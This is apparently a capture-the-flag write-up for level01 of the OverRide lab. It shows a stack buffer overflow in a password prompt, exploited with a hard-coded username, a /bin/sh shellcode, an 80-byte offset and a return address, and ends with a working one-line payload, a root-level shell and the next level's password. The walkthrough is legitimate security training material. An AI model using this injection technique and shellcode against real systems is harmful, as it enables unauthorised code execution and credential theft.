So in this level, we can manipulate 2 variables using two fgets.

```c
fgets(&a_user_name, 0x100(256), stdin);
fgets(&var_54, 0x64(100), stdin);
```

Let's start with the first fgets; there is a protection that allows us to write only 256 characters in a_user_name.

```
level01@OverRide:~$ python -c 'print("A" * 256)' | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....
nope, incorrect username...
```

No exploitable vulnerability here; let's move on to the next one! To proceed to the next step, we need verify_user_name() to return 0.

```c
if (verify_user_name() != 0)
{
    puts("nope, incorrect username...\n");
    eax_1 = 1;
}
else
{
    puts("Enter Password: ");
    fgets(&var_54, 0x64, stdin);
	...
}

int32_t verify_user_name()
{
    int32_t __saved_esi;
    bool c = &__saved_esi < 0x10;
    bool z = &__saved_esi == 0x10;
    puts("verifying username....\n");
    return (strncmp(&a_user_name, "dat_wil", 7));
}
```

Now we know that to move on to the second fgets, we simply need to input 'dat_wil'.

```
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
```

In the second fgets, we write to var_54, which has a size of 0x40 (64) bytes, but fgets allows us to write 0x64 (100) bytes into it GREAT!

```
Enter Password:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

Now, we'll need to find the offset, grab a shellcode, and the address of a_user_name. The payload will look like print(data_wil + shellcode + '\n' + "A" * offset + addr a_user_name + 7). The + 7 is to jump directly to the shellcode and skip reading dat_wil.

offset:
For the offset, I use https://wiremask.eu/tools/buffer-overflow-pattern-generator to generate a pattern.

```
Breakpoint 1, 0x080484d5 in main ()
(gdb) c
Continuing.
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```
0x37634136 = 80

shellcode:
I've retrieved the shellcode from a previous project.
```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

```
(gdb) info var
All defined variables:

Non-debugging symbols:
0x08048688  _fp_hw
0x0804868c  _IO_stdin_used
0x08048898  __FRAME_END__
0x08049f14  __CTOR_LIST__
0x08049f14  __init_array_end
0x08049f14  __init_array_start
0x08049f18  __CTOR_END__
0x08049f1c  __DTOR_LIST__
0x08049f20  __DTOR_END__
0x08049f24  __JCR_END__
0x08049f24  __JCR_LIST__
0x08049f28  _DYNAMIC
0x08049ff4  _GLOBAL_OFFSET_TABLE_
0x0804a014  __data_start
0x0804a014  data_start
0x0804a018  __dso_handle
0x0804a020  stdin@@GLIBC_2.0
0x0804a024  completed.6159
0x0804a028  dtor_idx.6161
0x0804a040  a_user_name <----------- adr
```

This gives us 
```
(python -c 'print("dat_wil\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80\n" + "A" * 80 + "\x47\xa0\x04\x08" )'; cat) | ./level01
```

```
level01@OverRide:~$ (python -c 'print("dat_wil\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80\n" + "A" * 80 + "\x47\xa0\x04\x08" )'; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
